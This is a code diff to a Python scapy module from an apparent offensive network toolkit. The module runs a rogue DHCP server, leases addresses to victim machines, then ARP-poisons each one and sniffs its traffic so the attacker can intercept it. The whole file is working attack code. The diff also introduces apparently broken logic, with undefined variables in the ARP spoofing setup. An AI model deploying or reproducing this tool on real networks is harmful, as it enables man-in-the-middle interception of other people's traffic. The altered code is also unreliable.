@@ -4,15 +4,14 @@ from poison import Poison
 from arp import arp
 from scapy.all import *
 
-#
-# Set up a rogue DHCP server and hand out IP addresses.  Once an IP has been dispensed, an
-# ARP poisoning session will be initiated for the host.  If the rogue DHCP is shutdown with hosts,
-# the ARP poisoning session will be destroyed, but the victim IP addresses we handed out will be the same.
-# This will allow the attacker an ability to configure an ARP poisoning session in the future if they so choose.
-#
-# ARP poisons will not appear under sessions, but will instead be managed by the spoofed_hosts dictionary.
-# Configure sniffers for traffic.
-#
+""" Set up a rogue DHCP server and hand out IP addresses.  Once an IP has been dispensed, an
+	ARP poisoning session will be initiated for the host.  If the rogue DHCP is shutdown with hosts,
+	the ARP poisoning session will be destroyed, but the victim IP addresses we handed out will be the same.
+	This will allow the attacker an ability to configure an ARP poisoning session in the future if they so choose.
+
+	ARP poisons will not appear under sessions, but will instead be managed by the spoofed_hosts dictionary.
+	Configure sniffers for traffic.
+"""
 class dhcp(Poison):
 	def __init__(self):
 		conf.verb = 0
@@ -22,10 +21,6 @@ class dhcp(Poison):
 		self.gateway = None
 		self.net_mask = None
 
-		self.running = False
-		self.dump_data = False
-		self.log_data = False
-		self.log_file = None
 		super(dhcp,self).__init__('DHCP Spoof')
 
 	def initialize(self):
@@ -46,21 +41,18 @@ class dhcp(Poison):
 			util.Error('[-] Error: %s'%j)
 			return False
 	
-	#
-	# sniff packets
-	#
 	def netsniff(self):
+		""" Packet sniffer """
 		sniff(prn=self.pkt_handler,store=0,stopper=self.test_stop,stopperTimeout=3)
 
-	#
-	# Handle traffic; wait for DHCPREQ or DHCPDISC; there are two cases.  Most systems, if they've 
-	# previously connected to the network, will skip the discovery stage and make a DHCP REQUEST.
-	# We can respond with a DHCPACK and hopefully get it; if we don't, we can still ARPP the host.
-	#
-	# New systems with DHCPDISCOVER first; in this case, we can quite easily gain control, give it
-	# our own address, and ARPP it.  
-	#
 	def pkt_handler(self, pkt):
+		""" Handle traffic; wait for DHCPREQ or DHCPDISC; there are two cases.  Most systems, if they've 
+			previously connected to the network, will skip the discovery stage and make a DHCP REQUEST.
+			We can respond with a DHCPACK and hopefully get it; if we don't, we can still ARPP the host.
+
+			New systems with DHCPDISCOVER first; in this case, we can quite easily gain control, give it
+			our own address, and ARPP it.  
+		"""
 		# is this a DHCP packet!? 
 		if self.running and DHCP in pkt:
 			for opt in pkt[DHCP].options:
@@ -101,8 +93,11 @@ class dhcp(Poison):
 					if self.dump_data: util.Msg('Handed \'%s\' out to \'%s\''%(self.curr_ip, pkt[Ether].src))
 					util.debug('Initializing ARP spoofing...')
 					tmp = ARPSpoof()
-					tmp.to_ip = self.curr_ip
-					tmp.from_ip = self.gateway
+					
+					victim = (to_ip, getmacbyip(to_ip))
+					target = (self.gateway, hw)
+					tmp.victim = victim
+					tmp.target = self.curr_ip
 					if not tmp.initialize_post_spoof() is None:
 						self.spoofed_hosts[self.curr_ip] = tmp 
 						util.debug('ARP spoofing successfully configured for \'%s\''%self.curr_ip)
@@ -129,10 +124,10 @@ class dhcp(Poison):
 					sendp(offer, loop=False)
 					if self.dump_data: util.Msg('Sent DHCP offer for \'%s\' to \'%s\''%(self.curr_ip, pkt[Ether].src))
 
-	#
-	# DHCP view, for now, just dumps the IPs it's handed out
-	#
 	def view(self):
+		""" Overriden view for dumping gateway/hosts 
+			before going into dump data mode
+		"""
 		print '\033[33m[!] Spoofed gateway: \033[32m%s\033[0m'%self.gateway
 		print '\033[33m[!] Currently Spoofing:\033[0m'
 		for key in self.spoofed_hosts:
@@ -146,19 +141,16 @@ class dhcp(Poison):
 			self.dump_data = False
 			return
 
-	#
-	# sniffer callback
-	#
 	def test_stop(self):
+		"""Sniffer callback"""
 		if self.running:
 			return False
 		util.debug('Stopping dhcp threads..')
 		return True
 
-	#
-	# shutdown the DHCP server and any ARP poisons
-	#
 	def shutdown(self):
+		""" Shutdown DHCP server and any ARP poisons
+		"""
 		self.running = False
 
 		# shutdown arp poisons if we have any running
@@ -166,7 +158,3 @@ class dhcp(Poison):
 			for key in self.spoofed_hosts:
 				self.spoofed_hosts[key].shutdown()
 		util.Msg('DHCP server shutdown.')
-
-	# configure a logging session
-	def log(self, opt, log_loc):
-		pass
